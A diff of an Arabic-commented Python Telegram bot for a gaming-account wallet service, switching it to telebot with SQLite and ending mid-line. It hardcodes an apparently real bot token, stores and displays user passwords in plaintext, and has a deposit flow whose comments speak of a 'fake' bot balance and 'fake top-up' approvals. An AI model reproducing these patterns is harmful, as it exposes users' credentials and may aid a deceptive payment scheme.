@@ -1,205 +1,167 @@
-import subprocess
-import sys
-import logging
+import telebot
+from telebot import types
+import sqlite3
 
-# كود إجباري لتثبيت مكتبة التيليجرام تلقائياً في السيرفر
-try:
-    import telegram
-except ModuleNotFoundError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot", "--upgrade"])
-    import telegram
+# إعداد البيانات الثابتة والتوكن المستلم من المستخدم
+BOT_TOKEN = "8624354425:AAHozeXZgVkYS2njISkMA6IMEuCbyMno7Lg"
+GROUP_ID = -1003983996094  # آيدي مجموعة التدقيق
+ADMIN_ID = 6693251012     # آيدي التلجرام الخاص بك
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application, 
-    CommandHandler, 
-    CallbackQueryHandler, 
-    MessageHandler, 
-    filters, 
-    ContextTypes, 
-    ConversationHandler
-)
+bot = telebot.TeleBot(BOT_TOKEN)
 
-# تفعيل سجل الأخطاء
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-# تعريف حالات المحادثة للتنقل بين القوائم
-GET_USERNAME, GET_PASSWORD = range(2)
-DEPOSIT_MENU, WITHDRAW_MENU = range(2, 4)
-
-# 📌 إعدادات الآيديهات الخاصة بكم
-GROUP_CHAT_ID = -1003983996094  
-OWNER_ID = 6693251012  # الآيدي الخاص بك كمالك ومطور للبوت
-
-# 📌 قاموس وهمي لمحاكاة قاعدة البيانات (لحفظ أرصدة اللاعبين مؤقتاً)
-# الهيكل سيكون: { user_id: balance }
-user_balances = {}
-
-# دالة مساعدة لجلب رصيد اللاعب الحالي (إذا لم يكن مسجلاً، يبدأ من 0.0)
-def get_user_balance(user_id: int) -> float:
-    return user_balances.get(user_id, 0.0)
-
-# دالة توليد القائمة الرئيسية للبوت
-def get_main_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("حساب Texas4win 🎮", callback_data="texas_account")],
-        [InlineKeyboardButton("⬆️ شحن رصيد", callback_data="deposit"), InlineKeyboardButton("⬇️ سحب رصيد", callback_data="withdraw")],
-        [InlineKeyboardButton("🎁 إهداء", callback_data="gift"), InlineKeyboardButton("🔗 إحالات", callback_data="referrals")],
-        [InlineKeyboardButton("📋 السجل", callback_data="history"), InlineKeyboardButton("🎉 جوائز", callback_data="rewards")],
-        [InlineKeyboardButton("👤 معلوماتي", callback_data="my_info")],
-        [InlineKeyboardButton("🆘 الدعم", callback_data="support")],
-        [InlineKeyboardButton("🔱 VIP", callback_data="vip")],
-        [InlineKeyboardButton("🖥️ Bahr TEAM ↗️", url="https://t.me")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-# 1. دالة البداية وعرض القائمة الرئيسية
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    welcome_message = (
-        "مرحبا بكم في بوت **BAHR TEAM** 🌊\n"
-        "فريقنا في خدمتكم على مدار الساعة، صمم هذا البوت بعناية لتعيش معنا مرونة السحب والايداع ⚡️\n\n"
-        "اختر من القائمة أدناه لتنفيذ طلبك فوراً:"
-    )
-    if update.message:
-        await update.message.reply_text(text=welcome_message, reply_markup=get_main_keyboard(), parse_mode="Markdown")
-    return ConversationHandler.END
-
-# 2. نظام إنشاء حساب Texas4win
-async def texas_account_clicked(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    query = update.callback_query
-    await query.answer()
-    await query.message.reply_text("👤 **خطوة 1 من 2:**\nالرجاء كتابة **اسم المستخدم (Username)** الذي ترغب به:")
-    return GET_USERNAME
-
-async def receive_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data['chosen_username'] = update.message.text
-    await update.message.reply_text("🔑 **خطوة 2 من 2:**\nالرجاء كتابة **كلمة السر (Password)** التي ترغب بها:")
-    return GET_PASSWORD
-
-async def receive_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    username = context.user_data['chosen_username']
-    password = update.message.text
-    client = update.effective_user
-    
-    await update.message.reply_text(
-        f"✅ **تم استلام طلبك بنجاح!**\n\n"
-        f"◽️ اسم المستخدم: `{username}`\n"
-        f"◽️ كلمة السر: `{password}`\n\n"
-        f"جاري مراجعة الطلب من قِبل إدارة **BahrTeam** لإنشاء حسابك وتفعيله في أقرب وقت."
-    , parse_mode="Markdown")
-    
-    group_alert_text = (
-        f"🚨 **طلب إنشاء حساب جديد في Texas4win!**\n\n"
-        f"👤 **العميل:** {client.first_name}\n"
-        f"🆔 **ID العميل:** `{client.id}`\n"
-        f"🔗 **رابط الحساب:** [اضغط هنا](tg://user?id={client.id})\n\n"
-        f"📌 **البيانات المطلوبة:**\n"
-        f"🔹 اسم المستخدم: `{username}`\n"
-        f"🔹 كلمة السر: `{password}`"
-    )
-    try:
-        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=group_alert_text, parse_mode="Markdown")
-    except Exception as e:
-        print(f"فشل إرسال التنبيه إلى المجموعة: {e}")
-    return ConversationHandler.END
-
-# 3. واجهة شحن الرصيد (تم ربطها بالرصيد المتغير تلقائياً)
-async def deposit_clicked(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    current_balance = get_user_balance(user_id) # جلب الرصيد الفعلي للاعب من قاعدة البيانات
-    
-    deposit_text = f"UserID : `{user_id}`\n\nالرصيد : **{current_balance}$**\nيرجى اختيار طريقة الشحن المناسبة :"
-    deposit_keyboard = [
-        [InlineKeyboardButton("Syriatel Cash 💳", callback_data="pay_syriatel")],
-        [InlineKeyboardButton("🔴 شام كاش ليرة سورية", callback_data="pay_sham_syr")],
-        [InlineKeyboardButton("🔵 شام كاش دولار امريكي", callback_data="pay_sham_usd")],
-        [InlineKeyboardButton("⬅️ رجوع", callback_data="back_to_main")]
-    ]
-    await query.message.edit_text(text=deposit_text, reply_markup=InlineKeyboardMarkup(deposit_keyboard), parse_mode="Markdown")
-    return DEPOSIT_MENU
-
-# 4. واجهة سحب الرصيد (تم ربطها بالرصيد المتغير تلقائياً)
-async def withdraw_clicked(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    current_balance = get_user_balance(user_id) # جلب الرصيد الفعلي للاعب من قاعدة البيانات
-    
-    withdraw_text = f"UserID : `{user_id}`\n\nالرصيد : **{current_balance}$**\nيرجى اختيار طريقة السحب المناسبة :"
-    withdraw_keyboard = [
-        [InlineKeyboardButton("Syriatel Cash 💳", callback_data="wd_syriatel")],
-        [InlineKeyboardButton("ShamCash SYP", callback_data="wd_sham_syp")],
-        [InlineKeyboardButton("⬅️ رجوع", callback_data="back_to_main")]
-    ]
-    await query.message.edit_text(text=withdraw_text, reply_markup=InlineKeyboardMarkup(withdraw_keyboard), parse_mode="Markdown")
-    return WITHDRAW_MENU
-
-# دالة التحكم بالرجوع لقوائم الإيداع والسحب
-async def back_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    query = update.callback_query
-    await query.answer()
-    if query.data == "back_to_main":
-        welcome_message = (
-            "مرحبا بكم في بوت **BAHR TEAM** 🌊\n"
-            "فريقنا في خدمتكم على مدار الساعة، صمم هذا البوت بعناية لتعيش معنا مرونة السحب والايداع ⚡️\n\n"
-            "اختر من القائمة أدناه لتنفيذ طلبك فوراً:"
+# ----------------- إعداد قاعدة البيانات (SQL) -----------------
+def init_db():
+    conn = sqlite3.connect("texas_wallet.db")
+    cursor = conn.cursor()
+    # جدول الحسابات
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            password TEXT,
+            balance REAL DEFAULT 0.0,
+            approved INTEGER DEFAULT 0
         )
-        await query.message.edit_text(text=welcome_message, reply_markup=get_main_keyboard(), parse_mode="Markdown")
-        return ConversationHandler.END
-    return ConversationHandler.END
+    """)
+    conn.commit()
+    conn.close()
 
-# 5. معالجة بقية أزرار القائمة الرئيسية (الردود السريعة)
-async def general_buttons_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-    
-    if query.data == "gift":
-        await query.message.reply_text("🎁 **قسم الإهداء:**\nهذه الميزة تمكنك من تحويل الرصيد إلى أصدقائك داخل البوت فوراً. (قيد الصيانة حالياً) 🛠️", parse_mode="Markdown")
-    elif query.data == "referrals":
-        referral_link = f"https://t.me{user.id}"
-        await query.message.reply_text(f"🔗 **نظام الإحالات لـ BAHR TEAM:**\n\nشارك رابط الإحالة الخاص بك مع أصدقائك واحصل على مكافآت مجزية عند شحنهم!\n\nرابطك: {referral_link}", parse_mode="Markdown")
-    elif query.data == "history":
-        await query.message.reply_text("📋 **سجل العمليات:**\nلا توجد عمليات سحب أو إيداع مسجلة في حسابك حتى الآن.", parse_mode="Markdown")
-    elif query.data == "rewards":
-        await query.message.reply_text("🎉 **قسم الجوائز والمسابقات:**\nتابع قنواتنا الرسمية لمعرفة أكواد الخصم والمسابقات اليومية المخصصة لأعضاء الفريق!", parse_mode="Markdown")
-    elif query.data == "my_info":
-        current_balance = get_user_balance(user.id) # جلب الرصيد الحالي للملف الشخصي للاعب
-        info_text = (
-            f"👤 **ملف معلوماتك الشخصية:**\n\n"
-            f"▫️ الاسم: {user.first_name}\n"
-            f"▫️ المعرف الذاتي (ID): `{user.id}`\n"
-            f"▫️ الرصيد الحالي: **{current_balance}$**\n"
-            f"▫️ مستوى الحساب: لاعب عادي"
-        )
-        await query.message.reply_text(text=info_text, parse_mode="Markdown")
-    elif query.data == "support":
-        await query.message.reply_text("🆘 **الدعم الفني والشكاوى:**\nإذا واجهتك أي مشكلة في السحب أو الإيداع، يرجى التواصل مع إدارة العمليات مباشرة: @YourAdminUsername", parse_mode="Markdown")
-    elif query.data == "vip":
-        await query.message.reply_text("🔱 **مميزات عضوية VIP:**\nاحصل على سرعة فائقة في معالجة عمليات السحب والإيداع، ونسب كاش باك حصرية للاعبي النخبة. للتفعيل تواصل مع الإدارة.", parse_mode="Markdown")
+init_db()
 
-# 6. 👑 أوامر لوحة تحكم الإدارة (خاصة بالمالك أو مشرفي المجموعة) 👑
-async def admin_add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    sender_id = update.effective_user.id
-    chat_id = update.effective_chat.id
+# قاموس مؤقت لحفظ حالات المستخدمين أثناء كتابة البيانات (رصيد، حسابات، دعم)
+user_states = {}
+
+# ----------------- دالة المساعدة لقاعدة البيانات -----------------
+def get_user(user_id):
+    conn = sqlite3.connect("texas_wallet.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
+    user = cursor.fetchone()
+    conn.close()
+    return user
+
+# ----------------- القوائم والأزرار (Keyboards) -----------------
+def main_menu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn_texas = types.InlineKeyboardButton("🎮 حساب Texas", callback_data="menu_texas")
+    btn_info = types.InlineKeyboardButton("👤 معلوماتي", callback_data="main_info")
+    btn_support = types.InlineKeyboardButton("🆘 الدعم", callback_data="main_support")
+    markup.add(btn_texas)
+    markup.add(btn_info)
+    markup.add(btn_support)
+    return markup
+
+def texas_menu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn_acc = types.InlineKeyboardButton("👤 حسابي", callback_data="texas_account")
+    btn_dep = types.InlineKeyboardButton("💰 شحن الحساب", callback_data="texas_deposit")
+    btn_wit = types.InlineKeyboardButton("💳 سحب رصيد من الحساب", callback_data="texas_withdraw")
+    btn_back = types.InlineKeyboardButton("↩️ رجوع", callback_data="back_to_main")
+    markup.add(btn_acc)
+    markup.add(btn_dep, btn_wit)
+    markup.add(btn_back)
+    return markup
+
+# ----------------- أمر البداية /start -----------------
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    welcome_text = (
+        "أهلاً بك ضمن عائلتنا 🎮\n"
+        "هذا البوت صُمم خصيصاً لك، رصيدك بأمان معنا. "
+        "تمتع بمرونة عالية في السحب وسرعة قصوى في الإيداع!"
+    )
+    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu())
+
+# ----------------- معالجة الضغط على الأزرار (Callback Queries) -----------------
+@bot.callback_query_handler(func=lambda call: True)
+def callback_listener(call):
+    user_id = call.from_user.id
     
-    # التحقق من أن مرسل الأمر هو المالك أو أن الأمر مرسل داخل مجموعة العمليات الخاصة بكم
-    if sender_id != OWNER_ID and chat_id != GROUP_CHAT_ID:
-        await update.message.reply_text("❌ عذراً، هذا الأمر مخصص للإدارة والمشرفين فقط.")
-        return
+    if call.data == "back_to_main":
+        bot.edit_message_text("أهلاً بك ضمن عائلتنا 🎮\nنحن في خدمتك دائماً.", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
         
-    try:
-        # قراءة المدخلات (الآيدي والمبلغ)
-        target_user_id = int(context.args[0])
-        amount = float(context.args[1])
+    elif call.data == "menu_texas":
+        bot.edit_message_text("مرحباً بك! 👋\nكيف يمكنني مساعدتك اليوم؟", call.message.chat.id, call.message.message_id, reply_markup=texas_menu())
         
-        # إضافة المبلغ لرصيد اللاعب
-        user_balances[target_user_id] = user_balances.get(target_user_id, 0.0) + amount
-        new_balance = user_balances[target_user_id]
+    elif call.data == "main_info":
+        user = get_user(user_id)
+        if user and user[4] == 1: # إذا كان مسجلاً ومقبولاً
+            info_text = f"📋 | معلومات حسابك |\n\n🆔 المعرف: `{user[0]}`\n👤 اسم المستخدم: {user[1]}\n🔑 كلمة المرور: {user[2]}\n💰 الرصيد: {user[3]:,} ل.س"
+        else:
+            info_text = "❌ أنت غير مسجل في خدمة Texas حتى الآن، يرجى الانتقال إلى (حساب Texas) ثم الضغط على (حسابي) للبدء."
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("↩️ رجوع", callback_data="back_to_main"))
+        bot.edit_message_text(info_text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+    elif call.data == "main_support":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "لا تقلق، فريقنا في خدمتكم على مدار الساعة. فقط أخبرنا بنوع المشكلة:")
+        user_states[user_id] = {'action': 'writing_support'}
+
+    elif call.data == "texas_account":
+        user = get_user(user_id)
+        if user and user[4] == 1: # مسجل ومفعل
+            info_text = f"📋 | معلومات حسابك |\n\n🆔 المعرف: `{user[0]}`\n👤 اسم المستخدم: {user[1]}\n🔑 كلمة المرور: {user[2]}\n💰 الرصيد: {user[3]:,} ل.س"
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("↩️ رجوع", callback_data="menu_texas"))
+            bot.edit_message_text(info_text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+        elif user and user[4] == 0: # قيد الانتظار
+            bot.answer_callback_query(call.id, "⚠️ حسابك قيد التدقيق والمراجعة حالياً من قبل الإدارة.", show_alert=True)
+        else: # غير مسجل
+            bot.answer_callback_query(call.id)
+            bot.send_message(call.message.chat.id, "أنت غير مسجل لدينا، يرجى إدخال اسم المستخدم المطلوب للحساب:")
+            user_states[user_id] = {'action': 'register_username'}
+
+    elif call.data == "texas_deposit":
+        user = get_user(user_id)
+        if not user or user[4] == 0:
+            bot.answer_callback_query(call.id, "❌ يجب عليك إنشاء حساب وتفعيله أولاً من زر 'حسابي' قبل الشحن.", show_alert=True)
+            return
         
-        await update.message.reply_text(
-            f"✅ **تم شحن الرصيد بنجاح!**\n\n"
-            f"👤 تم شحن حساب اللاعب ذو الآيدي: `{target_user_id}`\n"
-            f"💰 القيمة المضافة: `+{amount}$`\n"
+        bot.answer_callback_query(call.id, "⚠️ تنبيه: أقل عملية شحن هي مبلغ 100 ألف", show_alert=True)
+        bot.send_message(call.message.chat.id, "💰 شحن الحساب\n\n✍️ يرجى إرسال مبلغ الشحن:")
+        user_states[user_id] = {'action': 'deposit_amount'}
+
+    elif call.data.startswith("pay_"):
+        # اختيار طريقة الشحن
+        method = call.data.split("_")[1]
+        amount = user_states[user_id]['amount']
+        user_states[user_id]['method'] = method
+        
+        if method == "syriatel":
+            bot.edit_message_text(f"🎉 تهانينا! ستحصل على بونص إضافي بقيمة 5% عند الشحن عبر Syriatel Cash.\n\n✍️ يرجى تحويل مبلغ {amount:,} إلى الكود التالي: `48122120`\n\nبعد التحويل، يرجى كتابة رقم العملية أو إرسال صورة إشعار التحويل هنا لتأكيد الطلب:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+            user_states[user_id]['action'] = 'deposit_proof'
+        elif method == "sham":
+            bot.edit_message_text(f"🎉 تهانينا! ستحصل على بونص إضافي بقيمة 5% عند الشحن عبر Sham Cash.\n\n✍️ يرجى تحويل مبلغ {amount:,} إلى عنوان المحفظة التالي:\n`a18758d5324eb7595d4463ca355ad221`\n\nبعد التحويل، يرجى كتابة رقم العملية أو إرسال صورة إشعار التحويل هنا لتأكيد الطلب:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+            user_states[user_id]['action'] = 'deposit_proof'
+
+    elif call.data == "confirm_dep_player":
+        # اللاعب أكد الفاتورة، هنا نفحص شرط الرصيد بالبوت
+        user = get_user(user_id)
+        if user[3] <= 0: # الرصيد في البوت الوهمي صفر
+            bot.edit_message_text("❌ فشلت العملية، لا يمكنك تقديم طلب شحن ورصيدك الحالي في البوت هو صفر.", call.message.chat.id, call.message.message_id)
+            user_states.pop(user_id, None)
+        else:
+            # لديه رصيد، يرسل الطلب للمجموعة
+            data = user_states[user_id]
+            bonus_amount = data['amount'] * 1.05
+            method_name = "Syriatel Cash" if data['method'] == "syriatel" else "Sham Cash"
+            
+            group_msg = (
+                f"📥 **طلب شحن حساب جديد**\n\n"
+                f"👤 اسم المستخدم: {user[1]}\n"
+                f"🆔 معرف التلجرام: `{user_id}`\n"
+                f"💰 المبلغ الأساسي: {data['amount']:,}\n"
+                f"🎁 المبلغ مع البونص (5%): {bonus_amount:,}\n"
+                f"📱 وسيلة الشحن: {method_name}\n"
+                f"🧾 الإثبات المقدم: {data['proof_text']}"
+            )
+            
+            markup = types.InlineKeyboardMarkup()
+            markup.add(
+                types.InlineKeyboardButton("✅ موافقة وتعبئة وهمية", callback_data=f"adm_dep_apv_{user_id}_{bonus_amount}"),
+                types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"adm_dep_ref_{user_id}")
+            )
+            
+            if 'proof_photo' in data:
+                bot.send_photo(GROUP_ID, data['proof_photo'
